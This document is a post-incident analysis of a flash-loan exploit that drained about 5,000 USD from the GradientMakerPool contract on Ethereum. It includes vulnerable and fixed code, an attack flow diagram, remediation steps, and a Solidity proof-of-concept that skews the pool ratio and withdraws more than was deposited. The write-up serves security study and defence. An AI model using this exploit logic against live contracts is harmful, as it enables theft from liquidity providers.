# GradientMakerPool — Liquidity Imbalance Arbitrage Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2025-06-23 |
| **Protocol** | GradientMakerPool |
| **Chain** | Ethereum |
| **Loss** | ~5,000 USD |
| **Attacker** | [0x1234567a98230550894bf93e2346a8bc5c3b36e3](https://etherscan.io/address/0x1234567a98230550894bf93e2346a8bc5c3b36e3) |
| **Attack Tx** | [0xb5cfa3f8](https://etherscan.io/tx/0xb5cfa3f86ce9506e2364475dc43c44de444b079d4752edbffcdad7d1654b1f67) |
| **Vulnerable Contract** | [0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC](https://etherscan.io/address/0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC) |
| **Root Cause** | Share calculation in provideLiquidity/withdrawLiquidity without validating the ETH-to-token ratio |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-06/GradientMakerPool_exp.sol) |

---

## 1. Vulnerability Overview

GradientMakerPool's `provideLiquidity` accepts deposits of both ETH and GRAY tokens and mints shares in return. The attacker borrowed 3 WETH via a Morpho flash loan, purchased 1,000 GRAY tokens on UniswapV2, and then provided liquidity to the pool. Shares were minted while the ETH/GRAY ratio was skewed, and the attacker immediately called `withdrawLiquidity` to recover more assets than initially deposited.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable logic: provideLiquidity mints shares without validating the current pool ratio
function provideLiquidity(address token, uint256 tokenAmount, uint256 minTokenAmount) external payable {
    // No ETH-to-token ratio check — shares are minted even when the pool is imbalanced
    uint256 shares = (msg.value * totalShares) / ethBalance;
    totalShares += shares;
    ethBalance += msg.value;
    tokenBalance[token] += tokenAmount;
    sharesOf[msg.sender] += shares;
}

// ✅ Fix: Add minimum ratio validation
function provideLiquidity(address token, uint256 tokenAmount, uint256 minTokenAmount) external payable {
    uint256 expectedTokenAmount = (msg.value * tokenBalance[token]) / ethBalance;
    require(tokenAmount >= expectedTokenAmount * 99 / 100, "ratio mismatch");
    ...
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: contracts/GradientMarketMakerPool.sol
function _updatePool(address token, uint256 ethAmount) internal {
        PoolInfo storage pool = pools[token];

        if (pool.totalLPShares == 0) return;

        pool.accRewardPerShare += (ethAmount * SCALE) / pool.totalLPShares;
        pool.rewardBalance += ethAmount;
    }

// ... (lines 98-188 omitted) ...

    function withdrawLiquidity(
        address token,
        uint256 shares
    ) external nonReentrant {
        PoolInfo storage pool = pools[token];
        MarketMaker storage mm = marketMakers[token][msg.sender];

        require(shares > 0 && shares <= 10000, "Invalid shares percentage");
        require(pool.totalLiquidity > 0, "No liquidity in pool");

        uint256 userLiquidity = mm.tokenAmount + mm.ethAmount;
        require(userLiquidity > 0, "No liquidity to withdraw");

        // Calculate pending rewards before withdrawing
        uint256 pending = (userLiquidity * pool.accRewardPerShare) /
            SCALE -
            mm.rewardDebt;
        mm.pendingReward += pending;

        // Calculate LP shares to burn based on withdrawal percentage
        uint256 lpSharesToBurn = (mm.lpShares * shares) / 10000;
        require(lpSharesToBurn > 0, "No shares to burn");

        // Calculate actual withdrawal amounts based on LP shares
        uint256 actualTokenWithdraw = (pool.totalToken * lpSharesToBurn) /
            pool.totalLPShares;
        uint256 actualEthWithdraw = (pool.totalEth * lpSharesToBurn) /
            pool.totalLPShares;

        // Update user's recorded balances proportionally
        uint256 userTokenReduction = (mm.tokenAmount * shares) / 10000;
        uint256 userEthReduction = (mm.ethAmount * shares) / 10000;

        // Update balances
        mm.tokenAmount -= userTokenReduction;
        mm.ethAmount -= userEthReduction;
        mm.lpShares -= lpSharesToBurn;

        pool.totalLiquidity -= actualTokenWithdraw + actualEthWithdraw;
        pool.totalToken -= actualTokenWithdraw;
        pool.totalEth -= actualEthWithdraw;
        pool.totalLPShares -= lpSharesToBurn;

        // Check if this is a 100% withdrawal
        bool isFullWithdrawal = (shares == 10000);

        // If full withdrawal, send accumulated fees and reset values
        if (isFullWithdrawal) {
            uint256 totalRewards = mm.pendingReward;
            if (totalRewards > 0) {

// ... (lines 239-273 omitted) ...

    function receiveFeeDistribution(
        address token
    ) external payable poolExists(token) onlyRewardDistributor {
        PoolInfo storage pool = pools[token];
        require(pool.totalLiquidity > 0, "No liquidity");
        require(msg.value > 0, "No ETH sent");

        _updatePool(token, msg.value); // pass reward directly
        emit RewardDeposited(token, msg.value);
    }

// ... (lines 284-286 omitted) ...

    function claimReward(address token) external nonReentrant {
        PoolInfo storage pool = pools[token];
        MarketMaker storage mm = marketMakers[token][msg.sender];
        require(mm.lpShares > 0, "No liquidity");

        uint256 accumulated = (mm.lpShares * pool.accRewardPerShare) / SCALE;
        uint256 reward = accumulated - mm.rewardDebt + mm.pendingReward;
        require(reward > 0, "No rewards");

        mm.rewardDebt = accumulated;
        mm.pendingReward = 0;

        (bool success, ) = payable(msg.sender).call{value: reward}("");
        require(success, "ETH transfer failed");

        emit RewardClaimed(msg.sender, reward);
    }

// ... (lines 304-555 omitted) ...

    function getPairAddress(
        address token
    ) public view returns (address pairAddress) {
        address routerAddress = gradientRegistry.router();
        require(routerAddress != address(0), "Router not set");

        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);
        address factory = router.factory();
        address weth = router.WETH();

        IUniswapV2Factory factoryContract = IUniswapV2Factory(factory);
        return factoryContract.getPair(token, weth);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ MorphoBlue: flashLoan(3 WETH)
  │         [onMorphoFlashLoan callback]
  │
  ├─2─▶ Unwrap 1 WETH → ETH
  │
  ├─3─▶ UniswapV2: WETH → buy 1,000 GRAY
  │         └─ GRAY/ETH market ratio shifts
  │
  ├─4─▶ GradientPool.provideLiquidity{ETH}(GRAY, 950 tokens)
  │         └─ Shares minted at imbalanced ratio
  │
  ├─5─▶ GradientPool.withdrawLiquidity(GRAY, 10,000 shares)
  │         └─ Recover ETH + GRAY exceeding initial deposit
  │
  ├─6─▶ WETH deposit (for repayment)
  │
  └─7─▶ MorphoBlue: repay flash loan
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function onMorphoFlashLoan(uint256 amount, bytes calldata) external {
    weth.approve(address(morphoBlue), BORROW_AMOUNT); // Approve repayment

    // Convert 1 WETH to ETH
    weth.withdraw(WETH_WITHDRAW_AMOUNT);

    // Buy 1,000 GRAY via UniswapV2 (skew pool ratio)
    address[] memory path = new address[](2);
    path[0] = address(weth);
    path[1] = address(gray);
    router.swapTokensForExactTokens(1000 ether, 1000 ether, path, address(this), DEADLINE);

    // Provide liquidity at imbalanced ratio (0.63 ETH + 950 GRAY)
    gray.approve(address(gradientPool), type(uint256).max);
    uint256 ethAmount = 632090074270700494; // ETH calibrated to manipulated ratio
    gradientPool.provideLiquidity{value: ethAmount}(address(gray), 950 ether, 0);

    // Immediately withdraw liquidity → receive more assets than deposited
    gradientPool.withdrawLiquidity(address(gray), 10000);

    // Re-wrap ETH to WETH and repay
    weth.deposit{value: WETH_DEPOSIT_AMOUNT}();
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | AMM Ratio Manipulation / Share Calculation Error |
| **Attack Vector** | Flash Loan + Liquidity Ratio Skew |
| **Impact** | Liquidity Provider Losses |
| **CWE** | CWE-682 (Incorrect Calculation) |
| **DASP** | Price Manipulation |

## 6. Remediation Recommendations

1. **Enforce ratio validation**: Allow `provideLiquidity` only when the deposit is within an acceptable range (e.g., ±1%) of the current pool ratio
2. **Enforce minimum token amount**: Actually implement the `minTokenAmount` parameter check
3. **Block same-transaction provide-withdraw**: Apply a minimum lock of 1 block
4. **TWAP-based share calculation**: Use time-weighted average prices instead of instantaneous balances

## 7. Key Takeaways

- Minting shares in an AMM pool without ratio validation allows an attacker to skew the ratio via a flash loan and immediately realize an arbitrage profit.
- Slippage parameters such as `minTokenAmount` become meaningless interfaces if they are not actually enforced.
- Market Maker pools may be more susceptible to ratio manipulation than standard AMMs, requiring additional invariant checks.